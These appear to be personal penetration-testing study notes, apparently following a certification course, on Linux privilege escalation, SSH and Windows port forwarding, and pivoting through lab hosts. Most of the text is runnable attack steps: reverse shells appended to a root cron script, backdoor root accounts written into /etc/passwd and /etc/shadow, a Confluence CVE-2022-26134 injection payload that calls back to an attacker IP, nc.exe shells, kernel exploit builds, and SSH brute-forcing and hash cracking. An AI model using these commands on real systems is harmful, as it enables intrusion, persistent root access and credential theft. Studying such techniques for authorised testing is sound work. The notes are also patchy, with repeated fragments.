which is not readable by normal users. Historically however, password hashes, along with other account information, were stored in the world-readable file /etc/passwd. For backwards compatibility, if a password hash is present in the second column of an /etc/passwd user record, it is considered valid for authentication and it takes precedence over the respective entry in /etc/shadow, if available. This means that if we can write into /etc/passwd, we can effectively set an arbitrary password for any account.
```

### **Drives**

```jsx
On most systems, drives are automatically mounted at boot time. Because of this, it's easy to forget about unmounted drives that could contain valuable information. We should always look for unmounted drives, and if they exist, check the mount permissions.
```

`cat /etc/fstab`

`mount`

**IMPORTANT**

```jsx
Keep in mind that the system administrator might have used custom configurations or scripts to mount drives that are not listed in the /etc/fstab file. Because of this, it's good practice to not only scan /etc/fstab, but to also gather information about mounted drives using mount.
```

available disks : `lsblk`

```jsx
showing information for all local disks on the system might reveal partitions that are not mounted
```

### DRIVERS EXPLOIT

```jsx
Since this technique relies on matching vulnerabilities with corresponding exploits, we'll need to gather a list of drivers and kernel modules that are loaded on the target. We can enumerate the loaded kernel modules using lsmod without any additional arguments.
```

`lsmod`

`/sbin/modinfo libata(name )`

### Special Permission ( SETUID etc )

```jsx
Aside from the rwx file permissions described previously, two additional special rights pertain to executable files: setuid and setgid. These are symbolized with the letter "s".
```

```jsx
If these two rights are set, either an uppercase or lowercase "s" will appear in the permissions. This allows the current user to execute the file with the rights of the owner (setuid) or the owner's group (setgid).
```

`/bin/bash -p`

## SUID

```jsx
When running an executable, it normally inherits the permissions of the user that runs it. However, if the SUID permissions are set, the binary will run with the permissions of the file owner. This means that if a binary has the SUID bit set and the file is owned by root, any local user will be able to execute that binary with elevated privileges.
```

```jsx
When a user or a system-automated script launches a SUID application, it inherits the UID/GID of its initiating script: this is known as effective UID/GID (eUID, eGID), which is the actual user that the OS verifies to grant permissions for a given action.
```

```jsx
Any user who manages to subvert a setuid root program to call a command of their choice can effectively impersonate the root user and gains all rights on the system. Penetration testers regularly search for these types of files when they gain access to a system as a way of escalating their privileges.
```

`find / -perm -u=s -type f 2>/dev/null`

then try —version if any exploit available

```jsx
We can use find to search for SUID-marked binaries. In this case, we are starting our search at the root directory (/), searching for files (-type f) with the SUID bit set, (-perm -u=s) and discarding all error messages (2>/dev/null):
```

IMPORTANT

```jsx
In this case, the command found several SUID binaries. Exploitation of SUID binaries will vary based on several factors. For example, if /bin/cp (the copy command) were SUID, we could copy and overwrite sensitive files such as /etc/passwd.
```

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

https://book.hacktricks.xyz/linux-hardening/privilege-escalation

### **Automated Enumeration**

```jsx
unix-privesc-check  Built-in binary
./unix-privesc-check standard > output.txt
```

[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

IMPORTANT

```jsx
In a real assessment, we should run linPEAS again, once we have obtained privileged access to the system. Because the tool can now access files of other users and the system, it may discover sensitive information and data that wasn't accessible when running as daniela.
```

```jsx
Another interesting aspect of this finding is the path displayed starts with /srv/www/wordpress/. The WordPress instance is not installed in /var/www/html where web applications are commonly found on Debian-based Linux systems. While this is not an actionable result, we should keep it in mind for future steps.
```

```jsx
the user account that launched the pager.

daniela@websrv1:~$ sudo git -p help config

    Listing 25 - Abusing git sudo command by launching pager in a privileged context

To execute code through the pager, we can enter ! followed by a command or path to an executable file. As Figure 7 shows, we can enter a path to a shell. Let's use /bin/bash to obtain an interactive shell.

...
       •   no section or name was provided (ret=2),

       •   the config file is invalid (ret=3),

!/bin/bash

root@websrv1:/home/daniela# whoami
root

GIT
cd /srv/www/wordpress/
git status
git log
git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1

```

### **Exposed Confidential Information**

```jsx
These files are often called dotfiles because they are prepended with a period.
```

```jsx
.bashrc
env
Interestingly, the SCRIPT_CREDENTIALS variable holds a value that resembles a password. To confirm that we are dealing with a permanent variable, we need to inspect the .bashrc configuration file.
cat .bashrc
su - root
```

```jsx
Instead of aiming directly for the root account, we could try gaining access to the eve user we discovered during a previous section.

With our knowledge of script credentials, we could try building a custom dictionary derived from the known password to attempt brute forcing eve's account.

We can do this by using the crunch command line tool to generate a custom wordlist. We'll set the minimum and maximum length to 6 characters, specify the pattern using the -t parameter, then hard-code the first three characters to Lab followed by three numeric digits.
```

`crunch 6 6 -t Lab%%% > wordlist`  % = numeric

`hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V`

`sudo -l`

### **Inspecting Service Footprints**

```jsx
We can enumerate all the running processes with the ps command and since it only takes a single snapshot of the active processes, we can refresh it using the watch command. In the following example, we will run the ps command every second via the watch utility and grep the results on any occurrence of the word "pass".
```

```jsx
watch -n 1 "ps -aux | grep pass"
```

```jsx
tcpdump is the de facto command line standard for packet capture, and it requires administrative access since it operates on raw sockets. However, it's not uncommon to find IT personnel accounts have been given exclusive access to this tool for troubleshooting purposes.
```

```jsx
sudo tcpdump -i lo -A | grep "pass"  it possible that you have to change interface 
```

### **Abusing Cron Jobs**

```jsx
To leverage insecure file permissions, we must locate an executable file that not only allows us write access, but also runs at an elevated privilege level. On a Linux system, the cron time-based job scheduler is a prime target, since system-level scheduled jobs are executed with root user privileges and system administrators often create scripts for cron jobs with insecure permissions.
```

`grep "CRON" /var/log/syslog` 

`/var/log/cron.log`

```jsx
It appears that a script called user_backups.sh under /home/joe/ is executed in the context of the root user. Judging by the timestamps, it seems that this job runs once every minute.
```

`cat /home/joe/.scripts/user_backups.sh`

`ls -lah /home/joe/.scripts/user_backups.sh`

```jsx
cd .scripts
echo >> user_backups.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
cat user_backups.sh

Or use this one : /bin/bash -i >& /dev/tcp/192.168.45.195/9008 0>&1

OR 
echo 'mulware:x:0:0:root:/root:/bin/bash' >> /etc/passwd && echo 'mulware:$6$zgiqgdI7t6IeV0rG$8I9F1N/F5hrcs1.uMdDzrHoyVpAN6ZkMwnOiBZ/yVAMDax.S9AV57dR3tC.H5ULzIhxmZBOaLyhi/syTu7e8S/:19470:0:99999:7:::' >> /etc/shadow

mulware:admin
```

## LANGUAGES REVSHELLS

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

## **Abusing Password Authentication**

```jsx
Unless a centralized credential system such as Active Directory or LDAP is used, Linux passwords are generally stored in /etc/shadow
```

```jsx
which is not readable by normal users. Historically however, password hashes, along with other account information, were stored in the world-readable file /etc/passwd. For backwards compatibility, if a password hash is present in the second column of an /etc/passwd user record, it is considered valid for authentication and it takes precedence over the respective entry in /etc/shadow, if available. This means that if we can write into /etc/passwd, we can effectively set an arbitrary password for any account.
```

`openssl passwd w00t`

`echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd`

`su root2`

gawk 'BEGIN {system("id")}’  > capstone lab

MAKE SURE TO GENERATE NEW HASH ON EVERY NEW PC

## **Abusing Setuid Binaries and Capabilities**

```jsx
passwd
ps u -C passwd
grep Uid /proc/1932/status
cat /proc/1131/status | grep Uid
ls -asl /usr/bin/passwd
```

```jsx
As a practical example, once we've completed manual or automated enumeration, we'll have discovered that the find utility is misconfigured and has the SUID flag set.

We can quickly abuse this vulnerability by running the find program to search any well-known file, like our own Desktop folder. Once the file is found, we can instruct find to perform any action through the -exec parameter. In this case, we want to execute a bash shell along with the Set Builtin -p parameter that is preventing the effective user from being reset.
```

`find /home/joe/Desktop -exec "/usr/bin/bash" -p \;`

## *Linux capabilities*

```jsx
/usr/sbin/getcap -r / 2>/dev/null
```

```jsx
https://gtfobins.github.io/
```

`perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";’`

`LAB : gdb -nx -ex "dump value $LFILE \"root2:AP2eT4/ts0scc:0:0:root:/root:/bin/bash\"" -ex quit`

## **Abusing Sudo**

```jsx
On UNIX systems, the sudo utility can be used to execute a command with elevated privileges. To be able to use sudo, our low-privileged user account must be a member of the sudo group (on Debian based Linux distributions). The word "sudo" stands for "Superuser-Do", and we can think of it as changing the effective user-id of the executed command.

Custom configurations of sudo-related permissions can be applied in the /etc/sudoers file. We can use the -l or --list option to list the allowed commands for the current user.
```

IMPORTANT 

`sudo -l`

```jsx
If the /etc/sudoers configurations are too permissive, a user could abuse the short-lived administrative right to obtain permanent root access.

Since the first of the three permitted commands does not allow us to edit any crontab, it's unlikely that we could use this to find any escalation route. The second command looks more promising, so let's browse GTFObins for suggestions on how to abuse it.
```

https://gtfobins.github.io/gtfobins/tcpdump/#sudo

IMPORTANT

```jsx
Surprisingly, once we've executed the suggested command-set, we are prompted with a "permission denied" error message.

To further investigate the culprit, we can inspect the syslog file for any occurrence of the tcpdump keyword.
```

`cat /var/log/syslog | grep tcpdump`

```jsx
The output in Listing 50 shows that the audit daemon has logged our privilege escalation attempt. Closer inspection reveals that AppArmor was triggered and blocked us.

AppArmor is a kernel module that provides mandatory access control (MAC) on Linux systems by running various application-specific profiles, and it's enabled by default on Debian 10. We can verify AppArmor's status as the root user using the aa-status command.
```

Only with sudo : `aa-status` to check guard status

```
sudo apt-get changelog apt
!/bin/sh
```

## **Exploiting Kernel Vulnerabilities**

```jsx
cat /etc/issue
uname -r
arch
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"

cp /usr/share/exploitdb/exploits/linux/local/45010.c .
head 45010.c -n 20
mv 45010.c cve-2017-16995.c
scp cve-2017-16995.c joe@192.168.123.216:
gcc cve-2017-16995.c -o cve-2017-16995
file cve-2017-16995
./cve-2017-16995
```

## **Port Redirection and SSH Tunneling**

RANDOM

```jsx
Port redirection (a term we are using to describe various types of port forwarding) and tunneling are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means encapsulating one type of data stream within another, for example, transporting Hypertext Transfer Protocol (HTTP) traffic within a Secure Shell (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The logical topologies we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.
```

### *Confluence CVE-2022-26134 Confluence configuration file,*

`/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/`

```jsx
The URL path is an OGNL injection payload. OGNL is Object-Graph Notation Language, an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.
```

```jsx
The OGNL injection payload itself uses Java's ProcessBuilder class to spawn a Bash interactive reverse shell (bash -i).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in **the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although i**t's not always the case, for this exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.
```

# **Port Forwarding with Linux Tools**

FOR LAB : 

```jsx
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

`ip addr`

```jsx
The output shows us that CONFLUENCE01 has two network interfaces: ens192 and ens224. ens192 has the IP address 192.168.50.63, and ens224 has the IP address 10.4.50.63. We can now verify the current routing table using the ip route command to understand how traffic is being directed.
```

`ip route`

```jsx
The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the ens192 interface, and hosts in the 10.4.50.0/24 subnet through the ens224 interface.
```

```jsx
Continuing our enumeration, we'll find the Confluence configuration file at /var/atlassian/application-data/confluence/confluence.cfg.xml. While reading the contents using cat, we discover some plaintext database credentials located within.
```

As part of our enumeration of CONFLUENCE01, we'll find Socat installed

```jsx
In this scenario, we find it already installed, but Socat does not tend to be installed by default on *NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.
```

WHEN : 

```jsx
We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged confluence user, we are also unable to easily install software.
```

THEN : 

## **Port Forwarding with Socat**

[https://www.notion.so](https://www.notion.so)

`As part of our enumeration of CONFLUENCE01, we'll find Socat installed`

```jsx
In this scenario, we find it already installed, but Socat does not tend to be installed by default on *NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.
```

```jsx
On CONFLUENCE01, we'll start a verbose (-ddd) Socat process. It will listen on TCP port 2345 (TCP-LISTEN:2345), fork into a new subprocess when it receives a connection (fork) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (TCP:10.4.50.215:5432).
```

IMPORTANT

```jsx
We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.
```

`socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432`

![eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png](eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

`psql -h 192.168.50.63 -p 2345 -U postgres` 

`\l`

`\c confluence` 

`\dt`

`select * from cwd_user;` 

*Atlassian (PBKDF2-HMAC-SHA1)* hashes is *12001*,
`hashcat -h | grep "Atlassian”`
`hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt`

```jsx
We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.
```

```jsx
First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.
```

`socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22`

`ssh database_admin@192.168.50.63 -p2222`

IMPORTANT

```jsx

    rinetd is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.

    We can combine Netcat and a FIFO named pipe file to create a port forward.

    If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to /proc/sys/net/ipv4/conf/[interface]/forwarding (if it's not already configured to allow it).

```

`certutil -urlcache -f "http://<LHOST>:<LPORT>/<file>" <output-file>`

## SSH TUNNELING

```jsx
RANDOME :

SSH was initially developed to give administrators the ability to log in to their servers remotely through an encrypted connection. Before SSH, tools such as rsh, _rlogin_, and Telnet provided similar remote administration capabilities, but over an unencrypted connection.

In the background of each SSH connection, all shell commands, passwords, and data are transported through an encrypted tunnel built using the SSH protocol. The SSH protocol is primarily a tunneling protocol, allowing almost any kind of data to pass through an SSH connection. For that reason, tunneling capabilities are built into most SSH tools.
```

## TTY SHELL

 `python3 -c 'import pty; pty.spawn("/bin/sh")'`

```jsx
In our shell from CONFLUENCE01, we'll make sure we have TTY functionality by using the Python 3's pty module.

```

`ssh database_admin@10.4.50.215`

`for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done`

```jsx
We find that PGDATABASE01 is attached to another subnet, this time in the 172.16.50.0/24 range. We don't find a port scanner installed on PGDATABASE01; however, we can still do some initial reconnaissance with the tools that are available.

Let's write a Bash for loop to sweep for hosts with an open port 445 on the /24 subnet. We can use Netcat to make the connections, passing the -z flag to check for a listening port without sending data, -v for verbosity, and -w set to 1 to ensure a lower time-out threshold.
```

IMPORTANT

```jsx
We want to be able to enumerate the SMB service on this host. If we find anything, we want to download it directly to our Kali machine for inspection. There are at least two ways we could do this.

One way is to use whatever built-in tools we find on PGDATABASE01. However, if we did find anything, we would have to download it to PGDATABASE01, then transfer it back to CONFLUENCE01, then back to our Kali machine. This would create quite a tedious manual data transfer process.

The alternative is to use SSH local port forwarding. We could create an SSH connection from CONFLUENCE01 to PGDATABASE01. As part of that connection, we could create an SSH local port forward. This would listen on port 4455 on the WAN interface of CONFLUENCE01, forwarding packets through the SSH tunnel out of PGDATABASE01 and directly to the SMB share we found. We could then connect to the listening port on CONFLUENCE01 directly from our Kali machine.
```

```jsx
A local port forward can be set up using OpenSSH’s -L option, which takes a forwarding rule in the format:

[LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT

```

- The first part (LOCAL_IP:LOCAL_PORT) defines the listening socket on
the SSH client — where packets will enter the tunnel.
- The second part (DEST_IP:DEST_PORT) defines the destination socket
on the SSH server side — where packets will be forwarded to after
tunneling.

`ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215`

**-N** flag prevents SSH from executing 

to confirm ssh from another session : `ss -ntplu`
`smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234`
Connecting: `smbclient -p 4455  [//192.168.226.63/scripts](https://192.168.226.63/scripts) -U hr_admin --password=Welcome1234`

`ls`

`get Provisioning.ps1`

## Dynamic Port  Forwarding

```jsx
The forwarding behavior here isn’t automatic or "magic" —it works because client tools like Proxychains wrap outbound connections in SOCKS protocol headers. These headers tell the SOCKS server (in this case, OpenSSH) where to send the traffic. Without them, the server can’t forward the packets correctly.
```

`ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215`

```jsx
We can ensure that we're in a TTY shell using Python3's pty module. We will create our SSH connection to PGDATABASE01 using the database_admin credentials again. In OpenSSH, a dynamic port forward is created with the -D option. The only argument this takes is the IP address and port we want to bind to. In this case, we want it to listen on all interfaces on port 9999. We don't have to specify a socket address to forward to. We'll also pass the -N flag to prevent a shell from being spawned
```

```jsx
RANDOM : To use smbclient in this situation, we'll leverage Proxychains. Proxychains is a tool that can force network traffic from third party tools over HTTP or SOCKS proxies. As the name suggests, it can also be configured to push traffic over a chain of concurrent proxies.
The way Proxychains works is a light hack. It uses the Linux shared object preloading technique (LD_PRELOAD) to hook libc networking functions within the binary that gets passed to it and forces all connections over the configured proxy server. This means it might not work for everything but will work for most dynamically-linked binaries that perform simple network operations. It won't work on statically linked binaries.
```

```jsx
Although we specify socks5 in this example, it could also be socks4, since SSH supports both. SOCKS5 supports authentication, IPv6, and User Datagram Protocol (UDP), including DNS. Some SOCKS proxies will only support the SOCKS4 protocol. **Make sure you check which version is supported by the SOCKS server when using SOCKS proxies in engagements.**
```

`tail /etc/proxychains4.conf
socks5 192.168.50.63 9999`

`proxychains smbclient -L [//172.16.50.217/](https://172.16.50.217/) -U hr_admin --password=Welcome1234`

**Scanning** 

`sudo proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217`

*TCP-connect* scan (**-sT**), skip *DNS
resolution* (**-n**), skip the host discovery stage (**-Pn**) and only
check the top 20 ports (**--top-ports=20**)

IMPORTATNT

```jsx
By default, Proxychains is configured with very high time-out values. This can make port scanning really slow. Lowering the tcp_read_time_out and tcp_connect_time_out values in the Proxychains configuration file will force Proxychains to time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning times.
```

## **SSH Remote Port Forwarding**

```jsx
RANDOM:
Only in rare cases will we compromise credentials for an SSH user, allowing us to SSH directly into a network and port forward. We will only very rarely be able to access ports that we bind to a network perimeter.

However, we will more often be able to SSH out of a network. Outbound connections are more difficult to control than inbound connections. Most corporate networks will allow many types of common network traffic out - including SSH - for reasons of simplicity, usability, and business need. So, while it likely won't be possible to connect to a port we bind to the network perimeter, it will often be possible to SSH out.

This is where SSH remote port forwarding can be extremely useful. In a similar way that an attacker may execute a remote shell payload to connect back to an attacker-controlled listener, SSH remote port forwarding can be used to connect back to an attacker-controlled SSH server and bind the listening port there. We can think of it like a reverse shell, but for port forwarding.
```

```jsx
We can connect from CONFLUENCE01 to our Kali machine over SSH. The listening TCP port 2345 is bound to the loopback interface on our Kali machine. Packets sent to this port are pushed by the Kali SSH server software through the SSH tunnel back to the SSH client on CONFLUENCE01. They are then forwarded to the PostgreSQL database port on PGDATABASE01.
```

![0d919df53965e592fcd15eacbbebf5b1-PRAT2_4_0_SSHRemotePortForwarding.png](0d919df53965e592fcd15eacbbebf5b1-PRAT2_4_0_SSHRemotePortForwarding.png)

ON kali : `sudo systemctl start ssh`

 We ensure we have a TTY shell

`python3 -c 'import pty; pty.spawn("/bin/sh")'`

`ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4`

```jsx
In this case, we want to listen on port 2345 on our Kali machine (127.0.0.1:2345) and forward all traffic to the PostgreSQL port on PGDATABASE01 (10.4.50.215:5432).
```

`psql -h 127.0.0.1 -p 2345 -U postgres`

```jsx
Local port forwarding gives us direct, controlled access to internal services through an SSH tunnel. However, because each forward maps to only one socket, it can become unwieldy when targeting multiple systems or services—especially in fast-moving red team operations.
```

## **SSH Remote Dynamic Port Forwarding**

```jsx
Remote dynamic port forwarding is just another instance of dynamic port forwarding, so we gain all the flexibility of traditional dynamic port forwarding alongside the benefits of the remote configuration. We can connect to any port on any host that CONFLUENCE01 has access to by passing SOCKS-formatted packets through the SOCKS proxy port that is bound on our Kali machine.
```

important :

```jsx
Remote dynamic port forwarding has only been available since October 2017's OpenSSH 7.6. Despite this, only the OpenSSH client needs to be version 7.6 or above to use it - the server version doesn't matter.
```

```jsx
Let extend our scenario again. This time we find a Windows server (MULTISERVER03) on the DMZ network. The firewall prevents us from connecting to any port on MULTISERVER03, or any port other than TCP/8090 on CONFLUENCE01 from our Kali machine. But we can SSH out from CONFLUENCE01 to our Kali machine, then create a remote dynamic port forward so we can start enumerating MULTISERVER03 from Kali.
```

![0237c8503fc5a185bd4d7fee7d601c44-PRAT2_5_1_SSHRemoteDynamicPortForwardingScenarioPlan.png](0237c8503fc5a185bd4d7fee7d601c44-PRAT2_5_1_SSHRemoteDynamicPortForwardingScenarioPlan.png)

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

`ssh -N -R 9998 kali@192.168.118.4`

`tail /etc/proxychains4.conf`
`socks5 127.0.0.1 9998`

## **Using sshuttle**

IMPORTANT

```jsx
In situations where we have direct access to an SSH server, behind which is a more complex internal network, classic dynamic port forwarding might be difficult to manage. sshuttle is a tool that turns an SSH connection into something like a VPN by setting up local routes that force traffic through the SSH tunnel
```

`socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22`

Kali -----> 192.168.50.63:2222 -----> 10.4.50.215:22 -----> 172.16.50.0/24

`smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234`

# **Port Forwarding with Windows Tools**

## **ssh.exe**

```jsx
The OpenSSH client has been bundled with Windows by default since version 1803 (April 2018 Update), and has been available as a Feature-on-Demand since 1709 (Windows 10 Fall Creators Update). On Windows versions with SSH installed, we will find scp.exe, sftp.exe, ssh.exe, along with other ssh-* utilities in %systemdrive%\Windows\System32\OpenSSH location by default.
```

![55056d8ae49fdf69729b8a04320aa14b-PRAT2_6_0_WindowsSSHRemoteDynamicPortForwarding.png](55056d8ae49fdf69729b8a04320aa14b-PRAT2_6_0_WindowsSSHRemoteDynamicPortForwarding.png)

`sudo systemctl start ssh`

`xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64`

`where ssh`  windows

**IMPORTANT** 

Notably, the version of OpenSSH bundled with Windows is higher than 7.6, `ssh.exe -V`

Remote Dynamic : `ssh -N -R 9998 kali@192.168.118.4` 

`ss -ntplu`

`tail /etc/proxychains4.conf`

`proxychains psql -h 10.4.50.215 -U postgres **D@t4basePassw0rd!**`

```jsx
This technique is particularly useful on modern Windows systems where OpenSSH is installed by default. It provides parity with Linux tunneling workflows, making it valuable in mixed-OS environments. However, availability depends on OS version and whether administrators have removed or restricted the binaries. This method is most effective when RDP access is available and the OpenSSH client is already installed—common in modern enterprise Windows deployments.
```

Warning: remote port forwarding failed for listen port 9998 then use diff port

## **Plink**

```jsx
Administrators may want to avoid leaving OpenSSH on their Windows machines, so we're not guaranteed to discover an OpenSSH client. Even if we find ourselves on a recent version of Windows, the network administrators may have removed it.
```

```jsx
most network administrators' tools of choice were PuTTY and its command-line-only counterpart, Plink.
```

IMPORTANT

```jsx
We'll use Plink in this section, since in a security assessment, we will more likely have a shell than GUI access. The Plink manual explains that much of the functionality the OpenSSH client offers is also built into Plink (although one notable feature Plink doesn't have is remote dynamic port forwarding).
```

![5309d051409d7668a3bf93aec60e9821-PRAT2_7_0_WindowsPlinkSetup.png](5309d051409d7668a3bf93aec60e9821-PRAT2_7_0_WindowsPlinkSetup.png)

`LAB : **/umbraco/forms.aspx**.
nc -nvlp 4446
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446`

move plink to windows : `find / -name plink.exe 2>/dev/null`

`powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe`

```jsx
C:\Windows\Temp\plink.exe         # The path to plink.exe (PuTTY Link) being executed.
-ssh                              # Tells plink to use SSH protocol.
-l kali                           # Specifies the SSH login username as 'kali'.
-pw <YOUR PASSWORD HERE>          # Specifies the password for SSH authentication.
-R 127.0.0.1:9833:127.0.0.1:3389  # Reverse port forwarding: map port 9833 on remote to port 3389 on local.
192.168.118.4                     # The remote SSH server (running SSH daemon) to connect to.

```

`C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4`

***IMPORTANT***

```jsx
cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7.
```

`xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833`

## **Netsh**

IMPORTANT : Maybe there’s already a firewall rule that allows a specific port “

```jsx
Most Windows Firewall commands have PowerShell equivalents with commandlets like New-NetFirewallRule and Disable-NetFirewallRule. However, the netsh interface portproxy command doesn't. For simplicity, we've stuck with pure Netsh commands in this section. However, for a lot of Windows Firewall enumeration and configuration, PowerShell is extremely useful. You may wish to experiment with it while completing the exercises for this section.
```

```jsx
There is a native way to create a port forward on Windows we should explore: the built-in firewall configuration tool Netsh (also known as Network Shell). Using Netsh, we can set up a port forward with the portproxy subcontext within the interface context. While Netsh requires administrative privileges to create a port forward on Windows, it can be very useful in some restrictive situations.
```

```jsx
IMPORTANT :

The portproxy subcontext of the netsh interface command requires administrative privileges to make any changes. This means that in most cases we will need to take UAC into account. In this example, we're running it in a shell over RDP using an account with administrator privileges, so UAC is not a concern. However, we should bear in mind that UAC may be a stumbling block in other setups.
```

`xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64`

`netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215`

```jsx
Using this window, we can run Netsh. We'll instruct netsh interface to add a portproxy rule from an IPv4 listener that is forwarded to an IPv4 port (v4tov4). This will listen on port 2222 on the external-facing interface (listenport=2222 listenaddress=192.168.50.64) and forward packets to port 22 on PGDATABASE01 (connectport=22 connectaddress=10.4.50.215).
```

`netstat -anp TCP | find "2222”`

`netsh interface portproxy show all`

ISSUE

However, there's a problem. We can't connect to port 2222 from our
Kali machine. We'll specifically check port 2222 using **nmap**.

The response shows that port 2222 is *filtered*. It's most likely that
the Windows Firewall is blocking inbound connections to port 2222.

`netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow`

```jsx
We'll allow connections on the local port (localport=2222) on the interface with the local IP address (localip=192.168.50.64) using the TCP protocol, specifically for incoming traffic (dir=in).
```

`sudo nmap -sS 192.168.50.64 -Pn -n -p2222`

`ssh database_admin@192.168.50.64 -p2222`

`netsh advfirewall firewall delete rule name="port_forward_ssh_2222”`

`netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64`

Using powershell

```jsx
New-NetFirewallRule -DisplayName "port_forward_ssh_2222" `
  -Direction Inbound `
  -LocalPort 2222 `
  -Protocol TCP `
  -LocalAddress 192.168.50.64 `
  -Action Allow

Start-Process netsh -ArgumentList "interface portproxy show all"

```

📋 Show Rule Names, Directions, and Actions

Get-NetFirewallRule | Select-Object DisplayName, Direction, Action

🔍 Show All Enabled Rules Only

Get-NetFirewallRule | Where-Object { $_.Enabled -eq 'True' }

🔥 Filter by Inbound or Outbound firewall

```
Inbound: Get-NetFirewallRule | Where-Object { $_.Direction -eq 'Inbound' }

```

```
Outbound: Get-NetFirewallRule | Where-Object { $_.Direction -eq 'Outbound' }

```

# **Tunneling Through Deep Packet Inspection**

```jsx

    HTTP Tunneling Theory and Practice
    DNS Tunneling Theory and Practice

Deep packet inspection is a technology that's implemented to monitor traffic based on a set of rules. It's most often used on a network perimeter, where it can highlight patterns that are indicative of compromise.
```

```jsx
